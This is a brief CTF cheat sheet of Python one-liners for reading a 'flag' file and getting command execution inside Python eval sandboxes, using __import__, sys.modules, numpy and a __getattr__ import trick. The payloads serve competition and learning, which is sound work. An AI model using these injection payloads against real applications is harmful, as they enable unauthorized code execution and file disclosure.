# pythonCtfTricks

### reading content from a file:
---
* ```[*open("flag")]```
* ```type([ ] )(open("flag"))```
* ```__import__('numpy').loadtxt('flag') ``` - works with error reflecting
* ```__import__('numpy').fromfile('flag', dtype=numpy.uint8) ```
---
### rce
---
* ```__import__('os').system('cat flag')```
* ```__import__('sys').modules['os'].system('cat flag')      ```
* ```numpy.ctypeslib.os.system('cat flag') ```
* ```from os import system as __getattr__; from __main__ import sh ```
---
